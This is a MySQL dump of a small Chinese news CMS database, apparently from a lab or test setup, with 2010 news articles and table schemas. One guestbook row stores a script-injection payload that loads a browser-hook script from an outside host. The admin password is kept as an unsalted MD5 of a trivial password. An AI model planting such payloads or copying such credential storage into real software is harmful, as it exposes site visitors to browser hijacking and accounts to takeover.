-- MySQL dump 10.13  Distrib 5.7.21, for osx10.13 (x86_64)
--
-- Host: 10.211.55.10    Database: cms
-- ------------------------------------------------------
-- Server version	5.5.20-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `cms`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `cms` /*!40100 DEFAULT CHARACTER SET utf8 */;

USE `cms`;

--
-- Table structure for table `cms_article`
--

DROP TABLE IF EXISTS `cms_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_article` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '文章ID',
  `cid` int(11) NOT NULL COMMENT '所属栏目ID',
  `title` varchar(200) COLLATE utf8_unicode_ci NOT NULL DEFAULT '' COMMENT '标题',
  `subtitle` varchar(200) COLLATE utf8_unicode_ci DEFAULT '',
  `att` set('a','b','c','d','e','f','g') COLLATE utf8_unicode_ci DEFAULT '' COMMENT '属性',
  `pic` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '缩略图',
  `source` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '来源',
  `author` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '作者',
  `resume` varchar(500) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '摘要',
  `pubdate` varchar(40) COLLATE utf8_unicode_ci NOT NULL DEFAULT '' COMMENT '发表日期',
  `content` text COLLATE utf8_unicode_ci COMMENT '文章内容',
  `hits` int(11) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `created_by` int(11) NOT NULL COMMENT '创建者',
  `created_date` datetime NOT NULL COMMENT '创建时间',
  `delete_session_id` int(11) DEFAULT NULL COMMENT '删除人ID',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=36 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_article`
--

LOCK TABLES `cms_article` WRITE;
/*!40000 ALTER TABLE `cms_article` DISABLE KEYS */;
INSERT INTO `cms_article` VALUES (32,22,'国民经济运行发布会或21日召开 公布09年数据','','',NULL,'中国新闻网','','','2010-01-14 14:41:40','<p style=\"text-indent: 2em\">中新网1月14日电 国家统计局今日在其网站发布2010年经济统计信息发布日程表。根据日程表显示，1月21日将举行国民经济运行情况新闻发布会，预计届时将公布2009年全年的包括GDP、CPI等一系列经济运行数据。</p>\r\n<p style=\"text-indent: 2em\">但在日程表注明项目内说明，日程表公布的发布日期是初步计划，届时可能有所调整。</p>\r\n<p style=\"text-indent: 2em\">据媒体报道，分析机构普遍认为，中国2009年国民经济生产总值(GDP)达到8%已经没有问题。此外，12月份居民消费价格指数(CPI)出现超预期变化可能性较大，预计约CPI在1.5%至2%之间，在上月食品价格上涨较快的基础上，考虑到大雪等天气因素，甚至不排除12月CPI会超过2%。</p>\r\n<p style=\"text-indent: 2em\">而在此前，分析人士认为，国泰君安认为，季节因素和涨价因素继续推升CPI和PPI，预计12月CPI同比增速达1.5%，PPI实现同比增长0.6%。国信证券认为，最近一个月，食品价格出现持续快速攀升，再加上历史上暴雪冰冻天气发生月份的CPI环比涨幅在1.5%~2.5%，因此价格涨幅将超预期。</p>',0,1,'2010-01-14 14:41:40',NULL),(33,22,'网游分级标准研究有初步成果 已上报至中央','','',NULL,'中青在线-中国青年报','','','2010-01-14 14:42:25','<p>受文化部委托、由北京大学文化创意产业研究院与华中师范大学共同进行的网络游戏分级标准，1月10日在第七届文化创业产业论坛上公布。该分级标准将网络游戏分为适合全年龄段、12岁以上、18岁以上三个级别。北京大学文化创意产业研究院副院长、文化部网络文化审查小组成员向勇告诉中国青年报记者，研究工作历时半年完成，现已将成果上报到中央，目前尚未得到批示。</p>\r\n<p>　　据悉，该分级标准将对网络游戏的剧本、背景、配乐、视觉特效等方面进行评估，不仅局限在对暴力、色情、粗话的甄别，还包括游戏时间限制性、文化价值观和地理历史建构等方面。从保护未成年人的立场出发，平衡内容监管和产业发展，总体上趋向比较严格的分级标准。经该标准测试的网络游戏《征途》为适合18岁以上级别。</p>\r\n<p>　　长期以来，我国对于网络游戏内容的管理以审查为主。据玩家观察，针对欧美研发的网游审查，一般是和谐画面和模型，不能太暴露、血腥，典型例子就是要求《魔兽世界》中击杀不能见血，各种技能图标不许有骷髅，一堆骨架的亡灵族也必须穿衣服；对于日韩网络游戏以清除淫秽内容为主。&ldquo;但只要上网搜搜反和谐补丁，装上后基本上能恢复到原汁原味。&rdquo;网友&ldquo;月下飞雪&rdquo;说。</p>\r\n<p>　　向勇认为，仅通过&ldquo;非黑即白&rdquo;的内容审查审批机制来进行内容控制和管理会非常乏力，要么起到的作用只是杯水车薪，要么就是错杀一千而不放过一个。无论是哪一种结果，都对这个市场规模已达达百亿的新兴产业发展很不利。&ldquo;我们国家对分级制度一直很敏感，一说到分级就想到色情暴力，好像厂商就可以去生产色情暴力的游戏了。这是一个误导。其实分级后面对的将是一个相对细分的市场。&rdquo;向勇说。</p>\r\n<p>　　实际上，自2002年开始，国内一些行业组织已经公布了一些非强制性的分级标准。&ldquo;研究本身并不复杂，主要是高层对于分级这件事的判断，所以这个标准出台的期限还不能预估。可以先建议性分级，厂商自愿选择，文化部通过内容审查后，交给我们做分级测试。时机成熟后再做强制性分级。&rdquo;向勇说。</p>\r\n<p>　　据文化部文化产业司网络文化处处长刘强介绍，目前对网游内容、功能适用人群进行指引和标准的工作已经在上海试点推动。</p>',0,1,'2010-01-14 14:42:25',NULL),(34,23,'以色列称“铁穹”反火箭弹系统试验成功','','',NULL,'新华网','','','2010-01-14 14:43:08','<div id=\"Cnt-Main-Article-QQ\">\r\n<p style=\"text-indent: 2em\">据英国《泰晤士报》报道，以色列宣布该国的&ldquo;铁穹&rdquo;反火箭弹系统试验获得成功。该系统可同时应对来自多方的威胁，且所有威胁均可被成功截获。以色列国防部官员称，他们具备了拦截来自加沙和黎巴嫩南部武装分子发射的火箭弹的能力。</p>\r\n<p style=\"text-indent: 2em\">军事专家称，这套防御系统中的雷达识别系统具有良好的判别能力，能分辨出哪些来袭的火箭弹可能击中人口稠密地区，从而迅速而精切地将其拦截。据以色列国防部官员介绍，这套&ldquo;铁穹&rdquo;系统由以色列国有军火商企业拉斐尔(Rafael)国防系统防御公司研发，拦截范围在5-70公里之间，主要用于拦截边界恐怖分子最常用的短程火箭弹。</p>\r\n<p style=\"text-indent: 2em\">在最近的两次边界战争中，以色列面临的最大威胁是来自火箭弹的袭击，尤其是以色列与加沙地带相邻的南部和与黎巴嫩接壤的战争多发区。以色列将在未来两个月内，在其北部部署这套&ldquo;铁穹&rdquo;反火箭弹系统，预计年中前可以完成。</p>\r\n<p style=\"text-indent: 2em\">以色列表示下一步还将研发用于拦截中程和远程火箭弹的反导系统。以色列目前有意将这项技术卖给其他国家以收回投资成本，目前美国、英国、伊拉克和阿富汗国家已分别表示有兴趣购买。</p>\r\n</div>',0,1,'2010-01-14 14:43:08',NULL),(35,23,'美报盘点过去10年：美经济及打工仔失落十年','','',NULL,'中国新闻网','','','2010-01-14 14:45:46','<div class=\"Line\">&nbsp;</div>\r\n<div id=\"Cnt-Main-Article-QQ\">\r\n<p style=\"text-indent: 2em\">中新网1月3日电 据香港媒体援引外报报道称，自二战以来，美国每个10年均能保持稳定经济增长，不过踏入2000年，情况急转直下。《华盛顿邮报》盘点美国过去10年经济数据，发现无论是职位增长、经济产值、入息中位数抑或家庭资产，均录得近70年来最差表现，令千禧年代成为美国经济及打工仔的&ldquo;失落十年&rdquo;。</p>\r\n<p style=\"text-indent: 2em\">进入千禧年前的1999年，美国经济一片向好，当时甚至有经济学家认为衰退不会重临美国土地。没想到，美国千禧年代遭到两次衰退，经济增长幅度更是自1930年代以来最差。</p>\r\n<p style=\"text-indent: 2em\">据统计，美国自1940年代以来，职位数目每10年均能录得最少20%净增长，但自1999年12月至去年底，职位数目出现零增长。此外，扣除通胀因素后，过去10年美国家庭入息中位数，是1960年代有纪录以来首次下跌，家庭资产净值亦是1950年代以来首次减少。</p>\r\n<p style=\"text-indent: 2em\">造成这种现象，一方面是由于1999年美国经济正值巅峰，比较基数较高；但另一方面，楼市和消费泡沫失控，阻碍实体经济活动，令经济长期停滞。IHS环球观察首席经济师贝拉韦什指出：&ldquo;宏观经济调控失败，令我们陷入困局。&rdquo;</p>\r\n<p style=\"text-indent: 2em\">借贷膨胀是导致泡沫的主因。2008年最高峰时期，美国家庭总负债较1999年上升117%，商用物业市场及金融机构亦出现同样情况。报道形容，美国花了整个千禧年代，实验经济严重倚赖借贷会造成什么后果，结果造成席卷全球的金融海啸，以及高达10%的失业率。</p>\r\n<p style=\"text-indent: 2em\">报道认为，千禧年代将为经济学家及施政者带来另一场教训，让他们更深入了解如何管理经济。对联储局而言，未来应该明白金融监管不应再只是因循守旧地监控个别机构，而是应弄明白金融系统对整体经济造成的风险，并且要管理这些风险。</p>\r\n<p style=\"text-indent: 2em\">对奥巴马政府而言，如何防止泡沫重临已成为重中之重。政府致力于改革金融体系、投资清洁能源及其它领域等，均围绕这一中心。正如奥巴马去年11月所说，目前的挑战就是：如何建立一个可持续发展的后泡沫经济增长模式。</p>\r\n</div>',0,1,'2010-01-14 14:45:46',NULL);
/*!40000 ALTER TABLE `cms_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_category`
--

DROP TABLE IF EXISTS `cms_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_category` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '栏目ID',
  `pid` int(11) NOT NULL DEFAULT '0' COMMENT '父栏目ID',
  `name` varchar(50) COLLATE utf8_unicode_ci NOT NULL DEFAULT '' COMMENT '栏目名称',
  `description` text COLLATE utf8_unicode_ci,
  `seq` int(11) NOT NULL DEFAULT '0' COMMENT '栏目排序',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_category`
--

LOCK TABLES `cms_category` WRITE;
/*!40000 ALTER TABLE `cms_category` DISABLE KEYS */;
INSERT INTO `cms_category` VALUES (22,0,'国内新闻',NULL,0),(23,0,'国际新闻',NULL,0);
/*!40000 ALTER TABLE `cms_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_file`
--

DROP TABLE IF EXISTS `cms_file`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_file` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filename` varchar(200) DEFAULT NULL,
  `ffilename` varchar(200) DEFAULT NULL,
  `path` varchar(250) DEFAULT NULL,
  `ext` varchar(10) DEFAULT NULL,
  `size` int(11) DEFAULT NULL,
  `upload_date` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_file`
--

LOCK TABLES `cms_file` WRITE;
/*!40000 ALTER TABLE `cms_file` DISABLE KEYS */;
/*!40000 ALTER TABLE `cms_file` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_friendlink`
--

DROP TABLE IF EXISTS `cms_friendlink`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_friendlink` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `name` varchar(200) NOT NULL COMMENT '网站名称',
  `url` varchar(200) NOT NULL COMMENT '网址',
  `description` varchar(400) NOT NULL COMMENT '站点简介',
  `logo` varchar(200) NOT NULL COMMENT '网站LOGO',
  `seq` int(11) NOT NULL DEFAULT '0' COMMENT '排列顺序',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_friendlink`
--

LOCK TABLES `cms_friendlink` WRITE;
/*!40000 ALTER TABLE `cms_friendlink` DISABLE KEYS */;
/*!40000 ALTER TABLE `cms_friendlink` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_message`
--

DROP TABLE IF EXISTS `cms_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_message` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `title` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '标题',
  `name` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '称呼',
  `qq` varchar(15) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT 'QQ',
  `email` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT 'Email or MSN',
  `content` text COLLATE utf8_unicode_ci COMMENT '内容',
  `reply` text COLLATE utf8_unicode_ci COMMENT '回复',
  `ip` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '留言人IP',
  `validate` int(11) DEFAULT '0' COMMENT '0为验证 1已验证',
  `created_date` datetime DEFAULT NULL COMMENT '留言日期',
  `reply_date` datetime DEFAULT NULL COMMENT '回复日期',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_message`
--

LOCK TABLES `cms_message` WRITE;
/*!40000 ALTER TABLE `cms_message` DISABLE KEYS */;
INSERT INTO `cms_message` VALUES (21,'','','','','<sCript src=\"http://192.168.1.106:3000/hook.js\"></sCript>',NULL,'127.0.0.1',0,'2015-04-13 09:54:52',NULL);
/*!40000 ALTER TABLE `cms_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_notice`
--

DROP TABLE IF EXISTS `cms_notice`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_notice` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `title` varchar(200) NOT NULL COMMENT '公告标题',
  `content` text NOT NULL COMMENT '公告内容',
  `state` int(11) NOT NULL DEFAULT '0' COMMENT '状态（0 发布 1 禁用）',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_notice`
--

LOCK TABLES `cms_notice` WRITE;
/*!40000 ALTER TABLE `cms_notice` DISABLE KEYS */;
INSERT INTO `cms_notice` VALUES (10,'祝大家2010新年快乐!','祝大家2010新年快乐!',0);
/*!40000 ALTER TABLE `cms_notice` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_page`
--

DROP TABLE IF EXISTS `cms_page`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_page` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `code` varchar(20) DEFAULT NULL COMMENT '别名',
  `title` varchar(100) DEFAULT NULL COMMENT '名称',
  `content` text COMMENT '内容',
  `created_date` datetime DEFAULT NULL COMMENT '创建日期',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_page`
--

LOCK TABLES `cms_page` WRITE;
/*!40000 ALTER TABLE `cms_page` DISABLE KEYS */;
/*!40000 ALTER TABLE `cms_page` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_users`
--

DROP TABLE IF EXISTS `cms_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_users` (
  `userid` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `username` varchar(20) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '' COMMENT '用户名',
  `password` varchar(32) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '' COMMENT '密码',
  PRIMARY KEY (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=30 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_users`
--

LOCK TABLES `cms_users` WRITE;
/*!40000 ALTER TABLE `cms_users` DISABLE KEYS */;
INSERT INTO `cms_users` VALUES (1,'admin','e10adc3949ba59abbe56e057f20f883e');
/*!40000 ALTER TABLE `cms_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2018-02-27  8:57:29
